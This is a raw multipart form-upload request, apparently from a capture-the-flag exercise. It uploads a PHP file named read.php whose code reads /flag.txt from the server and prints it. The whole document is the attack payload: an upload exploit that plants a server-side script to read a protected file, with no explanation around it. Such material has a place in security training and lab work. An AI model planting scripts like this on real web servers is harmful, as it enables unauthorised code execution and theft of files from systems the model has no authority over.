------geckoformboundarye5206d672e959bab911e2792f3060784
Content-Disposition: form-data; name="file"; filename="read.php"
Content-Type: application/x-php

<?php
// read_flag.php - reads and displays the content of /flag.txt
$file_content = file_get_contents('/flag.txt');
echo "<pre>" . htmlspecialchars($file_content) . "</pre>";
?>

------geckoformboundarye5206d672e959bab911e2792f3060784--
